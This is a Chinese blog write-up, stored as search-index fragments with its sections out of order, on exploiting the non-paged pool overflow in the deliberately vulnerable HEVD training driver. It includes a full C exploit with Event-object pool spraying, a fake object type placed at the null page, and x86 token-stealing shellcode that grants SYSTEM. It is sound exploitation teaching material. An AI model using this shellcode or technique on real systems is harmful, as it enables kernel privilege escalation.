\u4e2d\u6316\u51fa\u5f88\u591a\u6b63\u597d\u7b26\u5408\u6211\u4eec\u8981\u6c42\u5927\u5c0f\u7684\u6d1e\uff0c\u4ee5\u786e\u4fdd\u6211\u4eec\u7684 kernel buff \u80fd\u6b63\u597d\u88ab\u5206\u914d\u5230\u8fd9\u5176\u4e2d\u7684\u4e00\u4e2a\u6d1e\u4e0a\u5e76\u4e14\u5176\u540e\u7d27\u8ddf\u7684\u662f\u5c5e\u4e8e x \u7684\u7a7a\u95f4\u3002 \u4e0d\u77e5\u9053\u8fd9\u6837\u8bf4\u5927\u5bb6\u80fd\u4e0d\u80fd\u7406\u89e3\uff0c\u6bd5\u7adf\u81ea\u5df1\u662f\u4e2a\u5e7c\u513f\u56ed\u6c34\u5e73\u7684\u753b\u624b\uff0c\u8fd9\u91cc\u5c31\u4e0d\u8d34\u56fe\u4e86\uff0c\u5c31\u7b97\u4e0d\u80fd\u7406\u89e3\u7b49\u4f1a\u513f\u770b\u770b\u4ee3\u7801\u518d\u6765\u56de\u987e\u4e00\u4e0b\u5e94\u8be5\u80fd\u61c2\u5427\u3002 \u6240\u4ee5\u4e3a\u4ec0\u4e48\u6211\u4eec\u8981\u7528 Event \u5bf9\u8c61\u5462? \u56e0\u4e3a\u6211\u4eec\u7684 kernel buffer \u5728\u6c60\u4e2d\u7684\u5927\u5c0f\u4e3a 0x200(0x1f8 + 0x8)\uff0c\u800c Event \u5bf9\u8c61\u5728\u6c60\u4e2d\u7684\u5927\u5c0f\u4e3a 0x40\u30020x40 * 8 = 0x200\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ea\u8981\u56de\u6536 8 \u4e2a Event \u5bf9\u8c61\u5c31\u80fd\u5728 x \u4e2d\u6316\u51fa\u4e00\u4e2a 0x200 \u5927\u5c0f\u7684\u6d1e\u3002\u800c\u4e14 0x40 \u4e5f\u6ee1\u8db3\u7b2c\u4e00\u6b65\u7684\u8981\u6c42\u3002 \u8986\u76d6 TypeIndex \u5c31\u50cf\u6808\u6ea2\u51fa\u4e00\u6837\uff0c\u6211\u4eec\u53ea\u8981\u901a\u8fc7\u6ea2\u51fa\u5c31\u80fd\u6539\u5199\u7d27\u8ddf\u5728 kernel buffer \u540e\u7684\u5185\u5b58\u7a7a\u95f4\u4e86\uff0c\u56e0\u6b64\u8986\u76d6 TypeIndex \u4e0d\u662f\u4ec0\u4e48\u95ee\u9898\u3002\u4f46\u662f\u8fd9\u91cc\u8981\u6ce8\u610f\u7684\u662f\u4e0d\u80fd\u7834\u574f\u539f\u672c\u7684 Event \u5bf9\u8c61\u7684\u7ed3\u6784\uff0c\u7279\u522b\u662f\u6c60\u5934\uff0c\u4e0d\u7136\u76f4\u63a5\u84dd\u5c4f\u3002\u56e0\u6b64\u6211\u4eec\u53ea\u4fee\u6539\u90a3\u4e48\u4e00\u4e2a\u5b57\u8282\u5c31\u597d\u4e86\u3002 \u4f2a\u9020 object type \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 NtAllocateVirtualMemory \u6765\u5206\u914d\u57fa\u5740\u4e3a 0x00000000 \u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u4f7f\u5176\u53d8\u6210\u53ef\u8bfb\u5199\u7684\u5b58\u5728\uff0c\u7136\u540e\u901a\u8fc7 WriteProcessMemory \u6765\u4e3a CloseProcedure \u8d4b\u503c\u3002 \u6267\u884c shellcode \u901a\u8fc7 CloseHandle \u6765\u56de\u6536\u88ab\u6211\u4eec\u4fee\u6539\u8fc7\u7684 Event \u5bf9\u8c61\u5c31\u80fd\u89e6\u53d1 CloseProcedure \u6765\u6267\u884c\u6211\u4eec\u7684 shellcode \u7684\u3002\u4f46\u95ee\u9898\u662f\u6211\u4eec\u4e0d\u77e5\u9053\u54ea\u4e00\u5757\u624d\u662f\u6211\u4eec\u4fee\u6539\u8fc7\u7684 Event \u5bf9\u8c61\u3002\u6ca1\u5173\u7cfb\uff0c\u6211\u4eec\u76f4\u63a5\u628a\u5269\u4e0b\u7684\u7a7a\u95f4\u5168\u90e8\u56de\u6536\u4e86\u5c31\u884c\uff0c\u800c\u4e14\u8fd9\u624d\u662f\u6b63\u786e\u7684\u7f16\u7a0b\u4e60\u60ef\uff0c\u4e0d\u7136\u5c31\u4f1a\u53d8\u6210\u4e00\u76f4\u5360\u7740\u6c60\u7a7a\u95f4\u4e0d\u7528\u4e86\u3002 0x02 \u975e\u6362\u9875\u6c60\u6ea2\u51fa\u6f0f\u6d1e\u5229\u7528 \u901a\u8fc7\u4e0a\u9762\u7684\u5206\u6790\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u5982\u4f55\u5229\u7528\u6f0f\u6d1e\u6765\u6267\u884c shellcode \u4e86\uff0c\u63a5\u4e0b\u6765\u8d34\u51fa\u6e90\u7801\u770b\u770b\u7ec6\u8282 // nonPagedpooloverflow.cpp : Defines the entry point for the console application. // #include stdafx.h #include windows.h #include Memoryapi.h #include intrin.h typedef NTSTATUS ( WINAPI * NtAllocateVirtualMemory_t ) ( HANDLE ProcessHandle , PVOID * BaseAddress , ULONG_PTR ZeroBits , PSIZE_T RegionSize , ULONG AllocationType , ULONG Protect ); char shellcode [] = { \\x90\\x90\\x90\\x90 // NOP Sled \\x60 // pushad \\x31\\xc0 // xor eax,eax \\x64\\x8b\\x80\\x24\\x01\\x00\\x00 // mov eax,[fs:eax+0x124] \\x8b\\x40\\x50 // mov eax,[eax+0x50] \\x89\\xc1 // mov ecx,eax \\xba\\x04\\x00\\x00\\x00 // mov edx,0x4 \\x8b\\x80\\xb8\\x00\\x00\\x00 // mov eax,[eax+0xb8] \\x2d\\xb8\\x00\\x00\\x00 // sub eax,0xb8 \\x39\\x90\\xb4\\x00\\x00\\x00 // cmp [eax+0xb4],edx \\x75\\xed // jnz 0x1a \\x8b\\x90\\xf8\\x00\\x00\\x00 // mov edx,[eax+0xf8] \\x89\\x91\\xf8\\x00\\x00\\x00 // mov [ecx+0xf8],edx \\x61 // popad \\xC2\\x10\\x00 // ret 16 }; int main () { char buf [ 504 ] = { 0 }; memset ( buf , A , sizeof ( buf )); char * payload = ( char * ) malloc ( sizeof ( buf ) + 40 ); memcpy ( payload , buf , sizeof ( buf )); char * temp = payload + 504 ; * ( PULONG ) temp = ( ULONG ) 0x04080040 ; temp = ( char * )(( ULONG ) temp + 0x4 ); * ( PULONG ) temp = ( ULONG ) 0xee657645 ; temp = ( char * )(( ULONG ) temp + 0x4 ); * ( PULONG ) temp = ( ULONG ) 0x00000000 ; temp = ( char * )(( ULONG ) temp + 0x4 ); * ( PULONG ) temp = ( ULONG ) 0x00000040 ; temp = ( char * )(( ULONG ) temp + 0x4 ); * ( PULONG ) temp = ( ULONG ) 0x00000000 ; temp = ( char * )(( ULONG ) temp + 0x4 ); * ( PULONG ) temp = ( ULONG ) 0x00000000 ; temp = ( char * )(( ULONG ) temp + 0x4 ); * ( PULONG ) temp = ( ULONG ) 0x00000001 ; temp = ( char * )(( ULONG ) temp + 0x4 ); * ( PULONG ) temp = ( ULONG ) 0x00000001 ; temp = ( char * )(( ULONG ) temp + 0x4 ); * ( PULONG ) temp = ( ULONG ) 0x00000000 ; temp = ( char * )(( ULONG ) temp + 0x4 ); * ( PULONG ) temp = ( ULONG ) 0x00080000 ; // begin exp LPVOID ptr = VirtualAlloc ( 0 , sizeof ( shellcode ), 0x3000 , 0x40 ); RtlCopyMemory ( ptr , shellcode , sizeof ( shellcode )); HMODULE hmodule = LoadLibraryA ( ntdll.dll ); NtAllocateVirtualMemory_t NtAllocateVirtualMemory = ( NtAllocateVirtualMemory_t ) GetProcAddress ( hmodule , NtAllocateVirtualMemory ); if ( NtAllocateVirtualMemory == NULL ) { printf ( getprocaddress failed \\n ); return 0 ; } PVOID baseAddress = ( PVOID ) 1 ; ULONG regionsize = 0x100 ; NTSTATUS status = NtAllocateVirtualMemory (( HANDLE ) 0xFFFFFFFF , baseAddress , 0 , regionsize , 0x3000 , 0x40 ); if ( status != 0 ) { printf ( alloc failed,error code is:%u \\n , status ); return 0 ; } if ( ! WriteProcessMemory (( HANDLE ) 0xFFFFFFFF , ( LPVOID ) 0x60 , ptr , 0x4 , NULL )) { printf ( write failed \\n ); return 0 ; } int i = 0 ; int j = 0 ; HANDLE spray1 [ 10000 ]; HANDLE spray2 [ 5000 ]; for ( i = 0 ; i 10000 ; i ++ ) { spray1 [ i ] = CreateEventA ( NULL , FALSE , FALSE , NULL ); } for ( i = 0 ; i 5000 ; i ++ ) { spray2 [ i ] = CreateEventA ( NULL , FALSE , FALSE , NULL ); } for ( i = 0 ; i ( sizeof ( spray2 ) / sizeof ( HANDLE )); i = i + 16 ) { for ( j = 0 ; j 8 ; j ++ ) { CloseHandle ( spray2 [ i + j ]); } } HANDLE hevDevice = CreateFileA ( \\\\\\\\ . \\\\ HackSysExtremeVulnerableDriver , 0xC0000000 , 0 , NULL , 0x3 , 0 , NULL ); DWORD lpBytesReturned = 0 ; DeviceIoControl ( hevDevice , 0x22200f , payload , sizeof ( buf ) + 40 , NULL , 0 , lpBytesReturned , NULL ); for ( i = 8 ; i ( sizeof ( spray2 ) / sizeof ( HANDLE )); i = i + 16 ) { for ( j = 0 ; j 8 ; j ++ ) { CloseHandle ( spray2 [ i + j ]); } } for ( i = 0 ; i 10000 ; i ++ ) { CloseHandle ( spray1 [ i ]); } system ( whoami ); return 0 ; } \u6e90\u7801\u90e8\u5206\u5c31\u4e0d\u7ec6\u8bf4\u4e86\uff0c\u5927\u5bb6\u5bf9\u7167\u7740 0x01 \u5c0f\u8282\u770b\u5c31\u597d\u4e86\u3002\u8fd9\u91cc\u8bf4\u4e00\u4e0b\u4e24\u4e2a\u5730\u65b9\u3002 \u7b2c\u4e00\u4e2a\u662f NtAllocateVirtualMemory\u3002\u4f60\u53ef\u80fd\u4f1a\u50cf\u6211\u4e00\u6837\u597d\u5947\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u503c\u4e3a\u4ec0\u4e48\u662f 1\u3002\u6211\u4eec\u770b\u770b\u5b98\u65b9\u6587\u6863\u600e\u4e48\u8bf4\u7684 \u9996\u5148\u6211\u4eec\u4e0d\u80fd\u8ba9\u7cfb\u7edf\u81ea\u5df1\u5206\u914d\uff0c\u56e0\u4e3a\u6211\u4eec\u8981\u786e\u5207\u5730\u4ece 0x00000000 \u5f00\u59cb\u5206\u914d\u3002\u7136\u540e\u8fd9\u4e2a\u503c\u6839\u636e\u6211\u7684\u6d4b\u8bd5\u7ed3\u679c\u53ea\u8981\u4f60\u586b\u4e00\u4e2a\u5927\u4e8e 0 \u7684\u6570\u7cfb\u7edf\u90fd\u4f1a\u4ece 0x00000000 \u5f00\u59cb\u5206\u914d\uff0c\u5176\u533a\u522b\u53ea\u5728\u4e8e\u5f71\u54cd\u5230\u7b2c\u56db\u4e2a\u53c2\u6570(RegionSize)\u7684\u8fd4\u56de\u503c\u3002\u6587\u6863\u4e0a\u8bf4\u662f rounded down\uff0c\u8fd9\u5e94\u8be5\u662f\u4e00\u4e2a\u56db\u820d\u4e94\u5165\u7684\u7b97\u6cd5\uff0c\u5177\u4f53\u4ece\u591a\u5c11\u5f00\u59cb rounded \u5230\u4e0b\u4e00\u4e2a\u6211\u4e0d\u592a\u6e05\u695a\uff0c\u53cd\u6b63\u5c0f\u4e00\u70b9\u5206\u914d\u672c\u9875\u9762\uff0c\u5927\u4e00\u70b9\u5c31\u662f\u8fde\u4e0b\u4e00\u4e2a\u9875\u9762\u90fd\u5206\u914d\u4e86\u3002\u56e0\u6b64\u8fd9\u4e2a\u503c\u53ea\u8981\u662f\u4e2a\u5927\u4e8e 0 \u7684\u6570\u5c31\u884c\u3002 \u7136\u540e\u662f\u5806\u6808\u5e73\u8861\u95ee\u9898\u3002 call dword ptr [edi + 60h] \u662f\u5b9e\u9645\u8c03\u7528\u6211\u4eec shellcode \u7684\u8bed\u53e5\u3002\u56e0\u4e3a\u5728\u8c03\u7528\u51fd\u6570\u524d\u538b\u5165\u4e86 4 \u4e2a\u53c2\u6570\uff0c\u6240\u4ee5\u6211\u4eec\u5728\u6700\u540e\u9700\u8981 ret 16 0x03 \u7ed3\u675f\u8bed \u8fd9\u6b21\u975e\u6362\u9875\u6c60\u6ea2\u51fa\u611f\u89c9\u53c8\u5b66\u5230\u4e86\u5f88\u591a\u4e1c\u897f\uff0c\u5199 exp \u4e5f\u719f\u7ec3\u591a\u4e86\uff0c\u867d\u7136\u53c8\u662f\u4e00\u5929\u6109\u5feb\u7684 error 99999 \uff1a ) 2019.9.3","title":"\uff08\u4e09\uff09HEVD \u975e\u6362\u9875\u6c60\u6ea2\u51fa"},{"location":"HEVD/nonPagedpooloverflow/#0x00","text":"\u672c\u7bc7\u7684\u5185\u5bb9\u4e3a\u975e\u6362\u9875\u6c60\u6ea2\u51fa\u6f0f\u6d1e\u5206\u6790\u5229\u7528","title":"0x00 \u524d\u8a00"},{"location":"HEVD/nonPagedpooloverflow/#0x01","text":"\u9996\u5148\u6253\u5f00 BufferOverflowNonPagedPool.c \u6587\u4ef6 \u6211\u4eec\u53ef\u4ee5\u5f88\u660e\u663e\u5730\u53d1\u73b0\u6c60\u6ea2\u51fa\u6f0f\u6d1e\u3002\u51fd\u6570\u63a5\u53d7\u6211\u4eec\u7684\u7528\u6237 buffer \u5e76\u76f4\u63a5\u5c06\u7528\u6237 buffer \u590d\u5236\u5230\u521a\u5206\u914d\u7684\u975e\u6362\u9875\u6c60\u4e2d\u3002 emmmm \u90a3\u73b0\u5728\u6211\u4eec\u53d1\u73b0\u4e86\u4e00\u4e2a bug \u4f46\u662f\u8fd9\u4e2a\u6f0f\u6d1e\u6709\u529e\u6cd5\u5229\u7528\u5417\uff1f\u5b83\u53c8\u4e0d\u50cf\u5728\u6808\u4e2d\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u8986\u76d6 eip \u6765\u63a7\u5236\u6307\u4ee4\u6d41\uff0c\u5728\u975e\u6362\u9875\u6c60\u4e2d\u9020\u6210\u6ea2\u51fa\u9664\u4e86\u84dd\u5c4f\u5916(\u662f\u7684\uff0c: )\u82e5\u6211\u4eec\u4fee\u6539\u4e86\u4e0d\u8be5\u6539\u7684\u4e1c\u897f\uff0c\u6bd4\u5982\u8bf4\u6c60\u5934\uff0c\u9a6c\u4e0a\u5c31\u84dd\u5c4f\u4e86\uff0c\u6709\u5174\u8da3\u7684\u670b\u53cb\u53ef\u4ee5\u8bd5\u8bd5\uff0c\u53cd\u6b63\u73a9 windows \u7ecf\u5e38\u7ed9\u6574\u5d29\uff0c\u8fd8\u597d\u6709\u865a\u62df\u673a)\u6211\u4eec\u6709\u529e\u6cd5\u63a7\u5236\u6307\u4ee4\u6d41\u5417\uff1f \u7b54\u6848\u662f\u80af\u5b9a\u7684\u3002\u4e0d\u8fc7\u9996\u5148\u6211\u4eec\u5148\u8865\u5145\u70b9\u77e5\u8bc6\u3002 \u5f53\u6211\u4eec\u901a\u8fc7 CreateXXX(\u6bd4\u5982\u8bf4 CreateEvent, CreateFile \u7b49\u7b49)\u521b\u5efa\u4e00\u4e2a\u5bf9\u8c61\u65f6\uff0c\u7cfb\u7edf\u4f1a\u81ea\u52a8\u5e2e\u6211\u4eec\u5728\u975e\u6362\u9875\u6c60\u4e2d\u7533\u8bf7\u4e00\u5757\u533a\u57df\u6765\u4fdd\u5b58\u8fd9\u4e2a\u5bf9\u8c61 \u6bd4\u5982\u6211\u4eec\u901a\u8fc7\u8fd9\u4e48\u4e00\u6bb5\u5c0f\u4ee3\u7801\u6765\u521b\u5efa Event \u5bf9\u8c61\u8bd5\u8bd5: import ctypes , sys , struct from ctypes import * from subprocess import * def main (): kernel32 = windll . kernel32 ntdll = windll . ntdll hevDevice = kernel32 . CreateFileA ( \\\\\\\\ . \\\\ HackSysExtremeVulnerableDriver , 0xC0000000 , 0 , None , 0x3 , 0 , None ) if not hevDevice or hevDevice == - 1 : print *** Couldn t get Device Driver handle. sys . exit ( 0 ) buf = A * 504 buf_ad = id ( buf ) + 20 spray_event1 = [] for i in xrange ( 20 ): spray_event1 . append ( kernel32 . CreateEventA ( None , False , False , None )) kernel32 . DeviceIoControl ( hevDevice , 0x22200f , buf_ad , len ( buf ), None , 0 , byref ( c_ulong ()), None ) if __name__ == __main__ : main () \uff08\u8fd9\u91cc\u4e3a\u4ec0\u4e48\u8981\u5206\u914d 20 \u4e2a Event \u5bf9\u8c61\uff0c\u662f\u56e0\u4e3a\u975e\u6362\u9875\u6c60\u6781\u6709\u53ef\u80fd\u975e\u5e38\u7684\u96f6\u788e\uff0c\u7b49\u4f1a\u513f\u6211\u4eec\u5c55\u793a TriggerBufferOverflowNonPagedPool \u51fd\u6570\u5206\u914d\u7684\u975e\u6362\u9875\u6c60\u9644\u8fd1\u7684\u7a7a\u95f4\u4e2d\u90fd\u53ef\u80fd\u6839\u672c\u770b\u4e0d\u5230 Event\uff0c\u591a\u5206\u914d\u4e00\u70b9\u597d\u627e\u4ec5\u6b64\u800c\u5df2\uff09\u4e0b\u597d\u65ad\u70b9\u540e\u6211\u4eec\u8fd0\u884c\u4e00\u4e0b\u4e0a\u9762\u7684\u7a0b\u5e8f\uff0c\u5728 windbg \u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u5230 \u547d\u4ee4\u662f !pool 0x85EABDC8 \u6211\u4eec\u5728\u56fe\u4e2d\u53ef\u4ee5\u770b\u5230\u6807\u7b7e\u4e3a Hack \u7684\u662f\u6211\u4eec\u7684\u6f0f\u6d1e\u51fd\u6570\u5206\u914d\u7684\u7a7a\u95f4\uff0c\u6807\u7b7e\u4e3a Even(t) \u4e14 size \u4e3a 40 \u7684\u662f\u6211\u4eec\u7684\u4ee3\u7801\u5206\u914d\u7684\u7a7a\u95f4\u3002\u5f53\u7136\u6c60\u4e2d\u53ef\u80fd\u8fd8\u6709\u5176\u5b83\u6807\u7b7e\u4e3a Even \u4f46\u662f size \u4e0d\u4e3a 40 \u7684\u5bf9\u8c61\uff0c\u90a3\u4e0d\u662f\u6211\u4eec\u5206\u914d\u7684\uff0c\u81f3\u4e8e\u4e3a\u4ec0\u4e48 size \u4e0d\u4e00\u6837\u662f\u56e0\u4e3a\u521b\u5efa\u7684\u573a\u666f\u548c\u4f20\u5165\u7684\u53c2\u6570\u90fd\u4f1a\u5f71\u54cd\u5230\u8fd9\u4e2a\u503c\u3002\u90a3\u4e3a\u4ec0\u4e48\u6211\u4eec\u53ef\u4ee5\u77e5\u9053 size \u4e3a 40 \u7684\u5c31\u662f\u6211\u4eec\u521b\u5efa\u7684\u5462\uff1f\u7b49\u4f1a\u513f spray \u7684\u65f6\u5019\u4f60\u770b\u5230\u90a3\u4e00\u5927\u5806\u7684 Even \u5c31\u53ef\u4ee5\u5f88\u663e\u7136\u5730\u77e5\u9053\u90a3\u662f\u6211\u4eec\u521b\u5efa\u7684\u4e86\uff0c\u90a3\u4e00\u5806 Even \u7684 size \u90fd\u662f 40\u3002 \u73b0\u5728\u6211\u4eec\u6765\u770b\u770b\u8fd9\u4e2a\u5bf9\u8c61\u5728\u6c60\u4e2d\u7684\u7ed3\u6784 \u7ea2\u8272\u90e8\u5206\u4e3a pool header \u9ec4\u8272\u90e8\u5206\u4e3a object header quota info \u84dd\u8272\u90e8\u5206\u4e3a object header \u7eff\u8272\u90e8\u5206\u4e3a object body \u8fd9\u5c31\u662f Even \u5bf9\u8c61\u7684 40 \u4e2a size \u7684\u5168\u90e8\u6784\u6210\u3002\u6211\u89c9\u5f97\u5176\u5b83\u7684\u90fd\u5e94\u8be5\u5f88\u597d\u7406\u89e3\uff0cheader + body \u561b\u3002\u4f46\u662f\u90a3\u4e2a quota info \u662f\u4ec0\u4e48\u9b3c\uff1f \u5728\u5bf9\u8c61\u4e2d\uff0c\u5bf9\u8c61\u5934\u7684\u4e0a\u65b9\u53ef\u80fd\u5b58\u5728\u53ef\u9009\u7684\u5934\u90e8\u4fe1\u606f\uff08\u4e5f\u79f0\u4e3a\u5b50\u5934\u90e8\uff09\uff0c\u53ef\u9009\u7684\u5934\u90e8\u4fe1\u606f\u4e00\u5171\u6709\u8fd9\u4e48\u51e0\u79cd\uff1a process info quota info handle info name info creator info \u63a9\u7801 0x10 0x08 0x04 0x02 0x01 \u5927\u5c0f 0x08 0x10 0x08 0x10 0x10 \u5728\u5bf9\u8c61\u521b\u5efa\u7684\u65f6\u5019\uff0c\u6839\u636e\u5bf9\u8c61\u7684\u79cd\u7c7b\u3001\u521b\u5efa\u7684\u573a\u666f\u4ee5\u53ca\u4f20\u5165\u7684\u53c2\u6570\u4e0d\u540c\uff0c\u53ef\u9009\u5934\u90e8\u6709\u53ef\u80fd\u5b58\u5728\uff0c\u4e5f\u6709\u53ef\u80fd\u4e0d\u5b58\u5728\u3002\u5b58\u5728\u7684\u8bdd\u6709\u53ef\u80fd\u53ea\u5b58\u5728\u4e00\u4e2a\uff0c\u4e5f\u6709\u53ef\u80fd\u540c\u65f6\u5b58\u5728\u591a\u4e2a\u3002\u5177\u4f53\u5b58\u5728\u4e0e\u5426\u53ef\u4ee5\u770b\u5230 object header \u4e2d\u7684 InfoMask\uff0c\u5176\u6307\u793a\u4e86\u8be5\u5bf9\u8c61\u5b58\u5728\u4f55\u79cd\u53ef\u9009\u5934\u90e8\u4fe1\u606f\u3002 \u6bd4\u5982\u8bf4\u4e0a\u56fe\u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u5230 InfoMask \u6bb5\u7684\u503c\u4e3a 0x8\uff0c\u56e0\u6b64\u53ef\u9009\u5934\u90e8\u4fe1\u606f\u4e3a quota info\uff0c\u6b63\u597d\u662f 0x10 \u4e2a\u5b57\u8282\u3002 \u8bf4\u662f\u8fd9\u6837\u8bf4\uff0c\u4f46\u6211\u4eec\u4e00\u5f00\u59cb dd 85eabfc0 \u7684\u65f6\u5019\uff0c\u600e\u4e48\u77e5\u9053\u5b83\u5230\u5e95\u6709\u6ca1\u6709\u53ef\u9009\u5934\u90e8\u4fe1\u606f\u4ee5\u53ca\u6709\u591a\u5c11\u4e2a\u5462\uff1f\uff08\u56e0\u4e3a\u5047\u8bbe\u8bf4\u4f60\u4e0d\u77e5\u9053\u6709\u6ca1\u6709\u53ef\u9009\u5934\u90e8\u4fe1\u606f\u4ee5\u53ca\u6709\u591a\u5c11\u4e2a\uff0c\u4f60\u5c31\u6839\u672c\u4e0d\u77e5\u9053 InfoMask \u7684\u504f\u79fb\u5230\u5e95\u662f\u591a\u5c11\uff09\u5982\u679c\u662f\u6b63\u7740\u5199\u7a0b\u5e8f\u7684\u8bdd\u6211\u4eec\u5f53\u7136\u77e5\u9053\u6211\u4eec\u662f\u5426\u6709\u521b\u5efa\u53ef\u9009\u5934\u90e8\u4fe1\u606f\u4ee5\u53ca\u90fd\u521b\u5efa\u4e86\u4ec0\u4e48\uff0c\u4f46\u6211\u4eec\u73b0\u5728\u662f\u76f4\u63a5\u9006\u7740\u6765\u901a\u8fc7\u770b\u6c60\u7ed3\u6784\u8fdb\u884c\u5206\u6790\u3002 \u8fd9\u4e2a\u53ea\u80fd\u8bf4\u770b\u7ecf\u9a8c\u4e86\uff0c\u4e00\u5171\u5c31\u4e24\u79cd\u5927\u5c0f\u7ec4\u4e00\u7ec4\u770b\u770b InfoMask \u5bf9\u4e0d\u5bf9\u5f97\u4e0a\uff0c\u82e5\u662f\u5bf9\u5f97\u4e0a\u7684\u8bdd\u4f60\u5c31\u77e5\u9053\u90fd\u521b\u5efa\u4e86\u4ec0\u4e48\u53ef\u9009\u5934\u90e8\u4fe1\u606f\u4e86\u3002 \u597d\u5230\u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86 Event \u5bf9\u8c61\u5728\u975e\u6362\u9875\u6c60\u4e2d\u7684\u7ed3\u6784\u4e86\u3002\u63a5\u4e0b\u6765\u770b\u770b\u6211\u4eec\u611f\u5174\u8da3\u7684\u4e1c\u897f: TypeIndex \u6bb5\u3002 \u6bcf\u4e2a\u5bf9\u8c61\u90fd\u6709\u5176\u5bf9\u5e94\u7684\u79cd\u7c7b\uff0c\u8fd9\u70b9\u5728\u5bf9\u8c61\u5934\u4e2d\u7528 TypeIndex \u6bb5\u8fdb\u884c\u6807\u8bc6\u3002TypeIndex \u7684\u503c\u4ee3\u8868\u7740\u8be5\u5bf9\u8c61\u7684 object type \u5728 ObTypeIndexTable \u4e2d\u7684\u504f\u79fb\u3002 \u6bd4\u5982\u4e0a\u56fe\u7684 TypeIndex \u6bb5\u7684\u503c\u4e3a 0xc\uff0c\u90a3\u4e48\u5176 object type \u7684\u5730\u5740\u5728\u8868\u4e2d\u7684\u4f4d\u7f6e\u5c31\u662f\u7ea2\u6846\u4e2d\u7684\u4f4d\u7f6e\u3002 \u73b0\u5728\u6211\u4eec\u770b\u770b Event \u5bf9\u8c61\u7684 object type \u6211\u4eec\u611f\u5174\u8da3\u7684\u6570\u636e\u6bb5\u4e3a TypeInfo\uff0c\u4e0b\u56fe\u662f TypeInfo \u7684\u7ed3\u6784 \u770b\u5230\u7ea2\u6846\u4e2d\u7684\u90e8\u5206\uff0c\u8fd9\u4e00\u90e8\u5206\u662f\u56de\u8c03\u51fd\u6570\uff0c\u5176\u542b\u4e49\u4e3a\u5f53\u8be5\u79cd\u7c7b\u7684\u5bf9\u8c61 XXX \u65f6\u6240\u8981\u8c03\u7528\u7684\u51fd\u6570\u7684\u5730\u5740\u3002 \u597d\uff0c\u5230\u73b0\u5728\u5e94\u8be5\u5df2\u7ecf\u8865\u5145\u5b8c\u4e86\u6211\u4eec\u6240\u9700\u8981\u7684\u77e5\u8bc6\u4e86\u3002 \u56de\u5230\u4e00\u5f00\u59cb\u7684\u95ee\u9898\uff0c\u6211\u4eec\u6709\u529e\u6cd5\u901a\u8fc7\u975e\u6362\u9875\u6c60\u6ea2\u51fa\u6f0f\u6d1e\u6765\u63a7\u5236\u6307\u4ee4\u6d41\u5417\uff1f\u4e0a\u9762\u4e5f\u8bf4\u4e86\u7b54\u6848\u662f\u80af\u5b9a\u7684\uff0c\u6211\u4eec\u53ea\u9700\u8981 \u4fdd\u8bc1\u6211\u4eec\u7684 kernel buffer \u540e\u7d27\u8ddf\u4e00\u4e2a Event \u5bf9\u8c61\u3002 \u4e3a\u4ec0\u4e48\u8981\u662f Event \u5bf9\u8c61\u5462\uff1f\u56e0\u4e3a\u6211\u4eec\u7684 kernel buffer \u5728\u6c60\u4e2d\u7684\u5927\u5c0f\u4e3a 0x200(0x1f8 + 0x8)\uff0c\u800c Event \u5bf9\u8c61\u5728\u6c60\u4e2d\u7684\u5927\u5c0f\u4e3a 0x40\u30020x40 * 8 = 0x200\u3002\u8fd9\u6709\u4ec0\u4e48\u7528\u5462\uff1f\u4e0b\u6587\u7684 pool spray \u4e00\u6587\u4e2d\u4f1a\u7ed9\u51fa\u89e3\u91ca\u3002 \u5982\u4f55\u4fdd\u8bc1\u6211\u4eec\u7684 kernel buffer \u540e\u7d27\u8ddf\u4e00\u4e2a Event \u5bf9\u8c61\u5462\uff1f\u8fd9\u53ef\u4ee5\u901a\u8fc7 pool spray \u6765\u5f97\u5230\u4fdd\u8bc1 \u901a\u8fc7\u6c60\u6ea2\u51fa\u6f0f\u6d1e\u8986\u76d6 kernel buffer \u540e\u7d27\u8ddf\u7684 Event \u5bf9\u8c61\u7684 object header \u4e2d\u7684 TypeIndex \u7684\u503c\u4e3a 0x00 \u4e3a\u4ec0\u4e48\u8981\u8986\u76d6\u4e3a 0x00 \u5462\uff1f\u56e0\u4e3a\u663e\u7136\u6211\u4eec\u6ca1\u529e\u6cd5\u5728\u7528\u6237\u6a21\u5f0f\u4e0b\u4fee\u6539 Event \u5bf9\u8c61\u7684 object type \u5b57\u6bb5\u7684\u503c\u3002\u4e0d\u8fc7\u770b\u5230 ObTypeIndexTable[0] \u7684\u503c\u4e3a 0x00000000\uff0c\u8fd9\u662f\u4e00\u4e2a NULL \u6307\u9488\uff0c\u6307\u5411\u7a7a\u6307\u9488\u533a\u3002\uff08x86 \u4e0b 0x00000000~0x0000FFFF \u662f\u4e00\u6bb5\u7a7a\u6307\u9488\u533a\uff0c\u7406\u8bba\u4e0a\u662f\u4e0d\u53ef\u8bfb\u5199\u7684\uff0c\u5bf9\u5b83\u8fdb\u884c\u8bfb\u5199\u5c31\u4f1a\u62a5\u9519\uff0c\u7528\u6765\u9884\u9632\u7a0b\u5e8f\u5458\u5bf9 NULL \u6307\u9488\u8fdb\u884c\u64cd\u4f5c\uff09\u6211\u4eec\u5728\u7528\u6237\u6a21\u5f0f\u4e0b\u53ef\u4ee5\u901a\u8fc7 NtAllocateVirtualMemory \u6765\u5206\u914d\u8fd9\u6bb5\u5730\u5740\u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u7528 WriteProcessMemory \u6765\u8986\u76d6\u8fd9\u6bb5\u5730\u5740\u7684\u5185\u5b58\u7a7a\u95f4\u3002\u56e0\u6b64\u6211\u4eec\u5c31\u53ef\u4ee5\u5728 0x00000000 \u5904\u4f2a\u9020\u4e00\u4e2a object type\uff0c\u6765\u4f7f kernel buffer \u540e\u7d27\u8ddf\u7684 Event \u5bf9\u8c61\u7684 TypeIndex \u6307\u5411\u8fd9\u4e2a object type \u5728 0x00000000 \u5904\u4f2a\u9020\u4e00\u4e2a object type\uff0c\u4f7f\u5b83\u7684 CloseProcedure \u6307\u5411\u6211\u4eec\u7684 shellcode \u8c03\u7528 CloseHandle \u6765\u6267\u884c\u6211\u4eec\u7684 shellcode","title":"0x01 